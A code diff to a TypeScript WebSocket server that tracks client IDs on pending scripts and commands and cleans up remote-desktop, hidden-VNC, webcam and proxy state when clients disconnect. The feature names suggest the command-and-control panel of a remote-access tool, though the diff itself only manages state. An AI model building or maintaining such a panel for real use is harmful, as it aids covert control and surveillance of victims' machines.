@@ -17,11 +17,13 @@ import { stopAllProxiesForClient } from "../socks5-proxy-manager";
 type PendingScript = {
   timeout: ReturnType<typeof setTimeout>;
   resolve: (value: { ok?: boolean; result?: string; error?: string }) => void;
+  clientId: string;
 };
 
 type PendingCommandReply = {
   timeout: ReturnType<typeof setTimeout>;
   resolve: (value: { ok: boolean; message?: string }) => void;
+  clientId: string;
 };
 
 type WsLifecycleDeps = {
@@ -333,6 +335,10 @@ export async function handleWebSocketMessage(
           logger.info(`[purgatory] kicking existing socket for ${resolvedId} (superseded)`);
           try { existingClient.ws.close(4004, "superseded"); } catch {}
           clientManager.deleteClient(resolvedId);
+          clearEnrollmentTimeout(resolvedId);
+          deps.rdStreamingState.delete(resolvedId);
+          deps.hvncStreamingState.delete(resolvedId);
+          deps.webcamStreamingState.delete(resolvedId);
         }
 
         ws.data.wasKnown = clientExists(resolvedId);
@@ -729,6 +735,20 @@ export function handleWebSocketClose(
   setOnlineState(clientId, false, storedDisconnectReason, storedDisconnectDetail);
   deps.clearPendingNotificationScreenshots(clientId);
   deps.clearClientPluginState(clientId);
+  for (const [cmdId, pending] of deps.pendingScripts) {
+    if (pending.clientId === clientId) {
+      clearTimeout(pending.timeout);
+      pending.resolve({ ok: false, error: "Client disconnected" });
+      deps.pendingScripts.delete(cmdId);
+    }
+  }
+  for (const [cmdId, pending] of deps.pendingCommandReplies) {
+    if (pending.clientId === clientId) {
+      clearTimeout(pending.timeout);
+      pending.resolve({ ok: false, message: "Client disconnected" });
+      deps.pendingCommandReplies.delete(cmdId);
+    }
+  }
   deps.rdStreamingState.delete(clientId);
   deps.hvncStreamingState.delete(clientId);
   deps.webcamStreamingState.delete(clientId);
